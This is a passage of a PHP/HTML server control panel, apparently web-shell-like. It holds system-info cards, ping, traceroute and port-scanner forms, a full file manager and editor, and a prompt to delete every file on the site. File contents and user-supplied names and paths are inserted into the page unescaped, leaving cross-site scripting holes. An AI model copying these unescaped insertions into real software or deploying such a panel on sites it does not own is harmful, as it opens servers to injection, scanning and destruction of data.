                        <p><strong>PHP Version:</strong> <?php echo htmlspecialchars($detailed_system_info['php_version']); ?></p>
                        <p><strong>Server Software:</strong> <?php echo htmlspecialchars($detailed_system_info['server_software']); ?></p>
                        <?php endif; ?>
                    </div>
                    
                    <div class="info-card">
                        <h4>Disk Usage</h4>
                        <?php if (isset($detailed_system_info['disk_usage']) && $detailed_system_info['disk_usage']): ?>
                        <div style="max-height: 200px; overflow-y: auto;">
                            <?php foreach ($detailed_system_info['disk_usage'] as $disk): ?>
                            <p><strong><?php echo htmlspecialchars($disk['filesystem']); ?>:</strong> 
                               <?php echo htmlspecialchars($disk['used']); ?>/<?php echo htmlspecialchars($disk['size']); ?> 
                               (<?php echo htmlspecialchars($disk['use_percent']); ?>)</p>
                            <?php endforeach; ?>
                        </div>
                        <?php endif; ?>
                    </div>
                    
                    <div class="info-card">
                        <h4>Memory Information</h4>
                        <?php if (isset($detailed_system_info['memory_detailed']) && $detailed_system_info['memory_detailed']): ?>
                        <?php foreach ($detailed_system_info['memory_detailed'] as $type => $mem): ?>
                        <p><strong><?php echo ucfirst($type); ?>:</strong> 
                           Used: <?php echo $mem['used']; ?>MB, 
                           Free: <?php echo $mem['free']; ?>MB, 
                           Total: <?php echo $mem['total']; ?>MB</p>
                        <?php endforeach; ?>
                        <?php endif; ?>
                    </div>
                    
                    <div class="info-card">
                        <h4>Running Services</h4>
                        <?php if (isset($detailed_system_info['running_services']) && $detailed_system_info['running_services']): ?>
                        <div style="max-height: 200px; overflow-y: auto;">
                            <?php foreach (array_slice($detailed_system_info['running_services'], 0, 10) as $service): ?>
                            <p><strong><?php echo htmlspecialchars($service['name']); ?>:</strong> 
                               <?php echo htmlspecialchars($service['description']); ?></p>
                            <?php endforeach; ?>
                        </div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>

            <!-- Network Tools Tab -->
            <div id="networktools-tab" class="tab-content">
                <h3>🔧 Advanced Network Tools</h3>
                <div class="responsive-grid">
                    <div class="info-card">
                        <h4>Ping Host</h4>
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                            <div class="form-group">
                                <label>Host/IP:</label>
                                <input type="text" name="ping_host" placeholder="google.com" required>
                            </div>
                            <div class="form-group">
                                <label>Count:</label>
                                <input type="number" name="ping_count" value="4" min="1" max="10">
                            </div>
                            <button type="submit" name="ping_action" class="btn btn-primary">🏓 Ping</button>
                        </form>
                    </div>
                    
                    <div class="info-card">
                        <h4>Traceroute</h4>
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                            <div class="form-group">
                                <label>Host/IP:</label>
                                <input type="text" name="traceroute_host" placeholder="google.com" required>
                            </div>
                            <button type="submit" name="traceroute_action" class="btn btn-primary">🛤️ Traceroute</button>
                        </form>
                    </div>
                    
                    <div class="info-card">
                        <h4>Port Scanner</h4>
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                            <div class="form-group">
                                <label>Host/IP:</label>
                                <input type="text" name="scan_host" placeholder="localhost" required>
                            </div>
                            <button type="submit" name="port_scan_action" class="btn btn-primary">🔍 Scan Ports</button>
                        </form>
                    </div>
                    
                    <div class="info-card">
                        <h4>Network Statistics</h4>
                        <?php if (isset($detailed_system_info['network_stats']) && $detailed_system_info['network_stats']): ?>
                        <div style="max-height: 200px; overflow-y: auto;">
                            <?php foreach ($detailed_system_info['network_stats'] as $stat): ?>
                            <p><strong><?php echo htmlspecialchars($stat['interface']); ?>:</strong> 
                               RX: <?php echo $stat['rx_ok']; ?>, TX: <?php echo $stat['tx_ok']; ?></p>
                            <?php endforeach; ?>
                        </div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>
    
        <!-- Enhanced File Manager UI -->
        <div class="file-manager">
            <div class="file-manager-header">
                <h2>📁 File Manager</h2>
                <div class="file-manager-controls">
                    <button class="btn btn-primary" onclick="refreshFileManager()">🔄 Refresh</button>
                    <button class="btn btn-warning" onclick="selectAllFiles()">☑️ Select All</button>
                    <button class="btn btn-danger" onclick="deleteSelected()" id="deleteSelectedBtn" disabled>🗑️ Delete Selected</button>
                    <button class="btn btn-success" onclick="downloadSelected()" id="downloadSelectedBtn" disabled>⬇️ Download Selected</button>
                </div>
            </div>
            
            <!-- Search and Filter Controls -->
            <div class="file-controls">
                <div class="search-controls">
                    <form method="GET" class="search-form">
                        <input type="hidden" name="fm_path" value="<?php echo htmlspecialchars($fm_path); ?>">
                        <input type="text" name="search" placeholder="🔍 Search files..." value="<?php echo htmlspecialchars($search_term); ?>" class="search-input">
                        <button type="submit" class="btn btn-primary">Search</button>
                        <?php if (!empty($search_term)): ?>
                            <a href="?fm_path=<?php echo urlencode($fm_path); ?>" class="btn btn-secondary">Clear</a>
                        <?php endif; ?>
                    </form>
                </div>
                
                <div class="sort-controls">
                    <form method="GET" class="sort-form">
                        <input type="hidden" name="fm_path" value="<?php echo htmlspecialchars($fm_path); ?>">
                        <input type="hidden" name="search" value="<?php echo htmlspecialchars($search_term); ?>">
                        <select name="sort" onchange="this.form.submit()">
                            <option value="name" <?php echo $sort_by === 'name' ? 'selected' : ''; ?>>Sort by Name</option>
                            <option value="size" <?php echo $sort_by === 'size' ? 'selected' : ''; ?>>Sort by Size</option>
                            <option value="date" <?php echo $sort_by === 'date' ? 'selected' : ''; ?>>Sort by Date</option>
                        </select>
                        <select name="order" onchange="this.form.submit()">
                            <option value="asc" <?php echo $sort_order === 'asc' ? 'selected' : ''; ?>>Ascending</option>
                            <option value="desc" <?php echo $sort_order === 'desc' ? 'selected' : ''; ?>>Descending</option>
                        </select>
                    </form>
                </div>
            </div>
            
            <!-- File Operations -->
            <div class="file-operations">
                <div class="operation-section">
                    <h4>📤 Upload Files</h4>
                    <form method="POST" enctype="multipart/form-data" class="upload-form">
                        <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                        <input type="file" name="upload_files[]" multiple class="file-input">
                        <button type="submit" name="upload_files" class="btn btn-success">Upload</button>
                    </form>
                </div>
                
                <div class="operation-section">
                    <h4>📄 Create File</h4>
                    <form method="POST" class="create-form">
                        <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                        <input type="text" name="new_file_name" placeholder="filename.txt" required>
                        <button type="submit" name="create_file" class="btn btn-primary">Create</button>
                    </form>
                </div>
                
                <div class="operation-section">
                    <h4>📁 Create Folder</h4>
                    <form method="POST" class="create-form">
                        <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                        <input type="text" name="new_folder_name" placeholder="folder_name" required>
                        <button type="submit" name="create_folder" class="btn btn-primary">Create</button>
                    </form>
                </div>
            </div>
            
            <!-- Navigation Breadcrumb -->
            <div class="breadcrumb">
                <a href="?fm_path=<?php echo urlencode($root_path); ?>" class="breadcrumb-item">🏠 Root</a>
                <?php
                $path_parts = explode(DIRECTORY_SEPARATOR, str_replace($root_path, '', $fm_path));
                $current_path = $root_path;
                foreach ($path_parts as $part) {
                    if (!empty($part)) {
                        $current_path .= DIRECTORY_SEPARATOR . $part;
                        echo ' / <a href="?fm_path=' . urlencode($current_path) . '" class="breadcrumb-item">' . htmlspecialchars($part) . '</a>';
                    }
                }
                ?>
            </div>
            
            <!-- File List -->
            <div class="file-list-container">
                <table class="file-table">
                    <thead>
                        <tr>
                            <th width="50px"><input type="checkbox" id="selectAll" onchange="toggleSelectAll()"></th>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Modified</th>
                            <th>Permissions</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        $items = listDirectory($fm_path, $search_term, $sort_by, $sort_order);
                        foreach ($items as $item):
                            $icon = getFileIcon($item['type'], $item['extension']);
                        ?>
                        <tr class="file-row" data-path="<?php echo htmlspecialchars($item['path']); ?>">
                            <td>
                                <input type="checkbox" class="file-checkbox" onchange="updateSelectionButtons()">
                            </td>
                            <td class="file-name">
                                <?php if ($item['is_dir']): ?>
                                    <a href="?fm_path=<?php echo urlencode($item['path']); ?>" class="file-link">
                                        <?php echo $icon; ?> <?php echo htmlspecialchars($item['name']); ?>
                                    </a>
                                <?php else: ?>
                                    <span class="file-name-text">
                                        <?php echo $icon; ?> <?php echo htmlspecialchars($item['name']); ?>
                                    </span>
                                <?php endif; ?>
                            </td>
                            <td class="file-size"><?php echo $item['is_dir'] ? '-' : formatBytes($item['size']); ?></td>
                            <td class="file-date"><?php echo date('Y-m-d H:i', $item['modified']); ?></td>
                            <td class="file-permissions"><code><?php echo $item['permissions']; ?></code></td>
                            <td class="file-actions">
                                <div class="action-buttons">
                                    <?php if (!$item['is_dir']): ?>
                                        <button class="btn btn-sm btn-primary" onclick="editFile('<?php echo htmlspecialchars($item['path']); ?>')" title="Edit">
                                            ✏️
                                        </button>
                                        <button class="btn btn-sm btn-success" onclick="downloadFile('<?php echo htmlspecialchars($item['path']); ?>')" title="Download">
                                            ⬇️
                                        </button>
                                    <?php endif; ?>
                                    <button class="btn btn-sm btn-warning" onclick="renameItem('<?php echo htmlspecialchars($item['path']); ?>', '<?php echo htmlspecialchars($item['name']); ?>')" title="Rename">
                                        📝
                                    </button>
                                    <button class="btn btn-sm btn-danger" onclick="deleteItem('<?php echo htmlspecialchars($item['path']); ?>', '<?php echo htmlspecialchars($item['name']); ?>')" title="Delete">
                                        🗑️
                                    </button>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
    <?php endif; ?>

        <?php if (isset($_GET['edit_file'])): ?>
        <div class="container" style="margin-top:30px;">
            <div class="file-editor-header">
            <h3>✏️ Edit File: <?php echo htmlspecialchars(basename($_GET['edit_file'])); ?></h3>
                <div class="editor-controls">
                    <button class="btn btn-success" onclick="saveFile()">💾 Save</button>
                    <button class="btn btn-warning" onclick="cancelEdit()">❌ Cancel</button>
                    <button class="btn btn-info" onclick="formatCode()">🎨 Format</button>
                </div>
            </div>
            
            <?php if ($file_edit_message): ?>
                <div class="message success"><?php echo $file_edit_message; ?></div>
            <?php endif; ?>
            
            <form method="post" id="fileEditForm">
                <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                <input type="hidden" name="edit_file_path" value="<?php echo htmlspecialchars($_GET['edit_file']); ?>">
                <div class="form-group">
                    <textarea name="file_content" id="fileContent" rows="25" style="width:100%;font-family:'Courier New',monospace;font-size:14px;padding:15px;border:2px solid #ddd;border-radius:8px;"><?php echo $file_content; ?></textarea>
                </div>
            </form>
            
            <div class="editor-info">
                <small>
                    <strong>File:</strong> <?php echo htmlspecialchars($_GET['edit_file']); ?> | 
                    <strong>Size:</strong> <?php echo formatBytes(strlen($file_content)); ?> | 
                    <strong>Lines:</strong> <span id="lineCount"><?php echo substr_count($file_content, "\n") + 1; ?></span>
                </small>
            </div>
        </div>
        <?php endif; ?>

    <script>
        function confirmFinalDeletion() {
            return confirm("FINAL WARNING: This will delete ALL files and directories on the entire site. Are you absolutely sure? This action cannot be undone!");
        }
        
        // Tab functionality
        function showTab(tabName) {
            // Hide all tab contents
            const tabContents = document.querySelectorAll('.tab-content');
            tabContents.forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Remove active class from all tab buttons
            const tabButtons = document.querySelectorAll('.tab-btn');
            tabButtons.forEach(btn => {
                btn.classList.remove('active');
            });
            
            // Show selected tab content
            document.getElementById(tabName + '-tab').classList.add('active');
            
            // Add active class to clicked button
            event.target.classList.add('active');
        }
        
        // Auto-save functionality for file editor
        let autoSaveTimeout;
        document.addEventListener('DOMContentLoaded', function() {
            const textarea = document.querySelector('textarea[name="file_content"]');
            if (textarea) {
                textarea.addEventListener('input', function() {
                    clearTimeout(autoSaveTimeout);
                    autoSaveTimeout = setTimeout(function() {
                        // Auto-save could be implemented here
                        console.log('Auto-save triggered');
                    }, 5000);
                });
            }
            
            // Initialize first tab as active
            const firstTab = document.querySelector('.tab-btn');
            if (firstTab) {
                firstTab.classList.add('active');
            }
        });
        
        // Real-time updates for system info
        function refreshSystemInfo() {
            // This could be implemented with AJAX for real-time updates
            console.log('Refreshing system info...');
        }
        
        // Auto-refresh every 30 seconds
        setInterval(refreshSystemInfo, 30000);
        
        // File Manager JavaScript Functions
        function refreshFileManager() {
            location.reload();
        }
        
        function toggleSelectAll() {
            const selectAll = document.getElementById('selectAll');
            const checkboxes = document.querySelectorAll('.file-checkbox');
            
            checkboxes.forEach(checkbox => {
                checkbox.checked = selectAll.checked;
            });
            
            updateSelectionButtons();
        }
        
        function updateSelectionButtons() {
            const checkboxes = document.querySelectorAll('.file-checkbox:checked');
            const deleteBtn = document.getElementById('deleteSelectedBtn');
            const downloadBtn = document.getElementById('downloadSelectedBtn');
            
            if (checkboxes.length > 0) {
                deleteBtn.disabled = false;
                downloadBtn.disabled = false;
            } else {
                deleteBtn.disabled = true;
                downloadBtn.disabled = true;
            }
        }
        
        function selectAllFiles() {
            const selectAll = document.getElementById('selectAll');
            selectAll.checked = true;
            toggleSelectAll();
        }
        
        function deleteSelected() {
            const checkboxes = document.querySelectorAll('.file-checkbox:checked');
            const selectedItems = Array.from(checkboxes).map(cb => {
                const row = cb.closest('.file-row');
                return row.dataset.path;
            });
            
            if (selectedItems.length === 0) {
                alert('Please select items to delete.');
                return;
            }
            
            if (confirm(`Are you sure you want to delete ${selectedItems.length} selected item(s)?`)) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.innerHTML = `
                    <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                    <input type="hidden" name="selected_items" value='${JSON.stringify(selectedItems)}'>
                    <input type="hidden" name="delete_multiple" value="1">
                `;
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        function downloadSelected() {
            const checkboxes = document.querySelectorAll('.file-checkbox:checked');
            const selectedFiles = Array.from(checkboxes).map(cb => {
                const row = cb.closest('.file-row');
                return row.dataset.path;
            }).filter(path => {
                // Only include files, not directories
                return !path.endsWith('/') && path.includes('.');
            });
            
            if (selectedFiles.length === 0) {
                alert('Please select files to download.');
                return;
            }
            
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = `
                <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                <input type="hidden" name="selected_files" value='${JSON.stringify(selectedFiles)}'>
                <input type="hidden" name="download_zip" value="1">
            `;
            document.body.appendChild(form);
            form.submit();
        }
        
        function editFile(filePath) {
            window.location.href = `?fm_path=<?php echo urlencode($fm_path); ?>&edit_file=${encodeURIComponent(filePath)}`;
        }
        
        function downloadFile(filePath) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = `
                <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                <input type="hidden" name="file_path" value="${filePath}">
                <input type="hidden" name="download_file" value="1">
            `;
            document.body.appendChild(form);
            form.submit();
        }
        
        function renameItem(itemPath, currentName) {
            const newName = prompt('Enter new name:', currentName);
            if (newName && newName !== currentName) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.innerHTML = `
                    <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                    <input type="hidden" name="item_path" value="${itemPath}">
                    <input type="hidden" name="new_name" value="${newName}">
                    <input type="hidden" name="rename_item" value="1">
                `;
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        function deleteItem(itemPath, itemName) {
            if (confirm(`Are you sure you want to delete "${itemName}"?`)) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.innerHTML = `
                    <input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">
                    <input type="hidden" name="item_path" value="${itemPath}">
                    <input type="hidden" name="delete_item" value="1">
                `;
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        // File Editor Functions
        function saveFile() {
            document.getElementById('fileEditForm').submit();
        }
        
        function cancelEdit() {
            if (confirm('Are you sure you want to cancel? Any unsaved changes will be lost.')) {
                window.location.href = '?fm_path=<?php echo urlencode($fm_path); ?>';
            }
        }
        
        function formatCode() {
            if (window.codeMirrorEditor) {
                // Auto-format code (basic implementation)
                const content = window.codeMirrorEditor.getValue();
                // This is a basic formatter - in production, use a proper code formatter
                const formatted = content.replace(/\n\s*\n/g, '\n').replace(/\{\s*\n/g, '{\n').replace(/\n\s*\}/g, '\n}');
                window.codeMirrorEditor.setValue(formatted);
            }
        }
        
        // Initialize CodeMirror for file editing
        function initializeCodeMirror() {
            const textarea = document.querySelector('textarea[name="file_content"]');
            if (textarea && typeof CodeMirror !== 'undefined') {
                // Determine file type for syntax highlighting
                const fileName = '<?php echo basename($_GET['edit_file'] ?? ''); ?>';
                let mode = 'text/plain';
                
                if (fileName.endsWith('.php')) mode = 'text/x-php';
                else if (fileName.endsWith('.js')) mode = 'text/javascript';
                else if (fileName.endsWith('.css')) mode = 'text/css';
                else if (fileName.endsWith('.html') || fileName.endsWith('.htm')) mode = 'text/html';
                else if (fileName.endsWith('.json')) mode = 'application/json';
                else if (fileName.endsWith('.xml')) mode = 'text/xml';
                
                window.codeMirrorEditor = CodeMirror.fromTextArea(textarea, {
                    lineNumbers: true,
                    mode: mode,
                    theme: 'monokai',
                    indentUnit: 4,
                    lineWrapping: true,
                    autoCloseBrackets: true,
                    matchBrackets: true,
                    foldGutter: true,
                    gutters: ['CodeMirror-linenumbers', 'CodeMirror-foldgutter'],
                    extraKeys: {
                        "Ctrl-S": function(cm) {
                            saveFile();
                        },
                        "F11": function(cm) {
                            cm.setOption("fullScreen", !cm.getOption("fullScreen"));
                        },
                        "Esc": function(cm) {
                            if (cm.getOption("fullScreen")) cm.setOption("fullScreen", false);
                        }
                    }
                });
                
                // Update line count
                window.codeMirrorEditor.on('change', function() {
                    const lineCount = window.codeMirrorEditor.lineCount();
                    const lineCountElement = document.getElementById('lineCount');
                    if (lineCountElement) {
                        lineCountElement.textContent = lineCount;
                    }
                });
                
                // Auto-save functionality
                window.codeMirrorEditor.on('change', function() {
                    clearTimeout(window.autoSaveTimeout);
                    window.autoSaveTimeout = setTimeout(function() {
                        console.log('Auto-save triggered');
                        // Could implement auto-save here
                    }, 5000);
                });
            }
        }
        
        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            initializeCodeMirror();
            
            // Initialize first tab as active
            const firstTab = document.querySelector('.tab-btn');
            if (firstTab) {
                firstTab.classList.add('active');
            }
        });
    </script>
    
    <!-- Bootstrap 5 JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <!-- CodeMirror JS -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/php/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/htmlmixed/htmlmixed.min.js"></script>
</body>
</html>
